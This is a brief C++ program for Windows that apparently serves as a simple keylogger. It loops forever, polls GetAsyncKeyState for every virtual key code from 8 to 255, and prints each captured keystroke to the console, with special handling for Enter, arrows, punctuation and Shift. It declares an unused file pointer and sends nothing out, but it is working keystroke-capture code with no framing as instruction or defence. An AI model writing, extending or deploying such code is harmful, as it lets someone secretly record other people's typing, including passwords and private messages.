#include <windows.h>
//#include <winuser.h>
#include <iostream>

int main(){
	FILE* fp;
	int key=0x00;
	while(1){
		for (key=8; key<=255; key++){
			if (GetAsyncKeyState(key) == -32767){
				switch(key){
					case 0x0d:
						printf ("\r\n");
						break;
					case 0xdc:
						printf("\\");
						break;
					case 0x25:
						printf ("<Left Arrow>");
						break;
					case 0x26:
						printf ("<Up Arrow>");
						break;
					case 0x27:
						printf ("<Right Arrow>");
						break;
					case 0x28:
						printf("<Bottom Arrow>");
						break;
					case 0x10:
						break;
					case 0xbe:
						printf(".");
						break;
					case 0xbc: 
						printf(",");
						break;
					default: 
						if (key>64&&key<92&&!(GetAsyncKeyState(0x10)))key+=32;
							printf("%c", key);
				}
			}
		}
	}
}
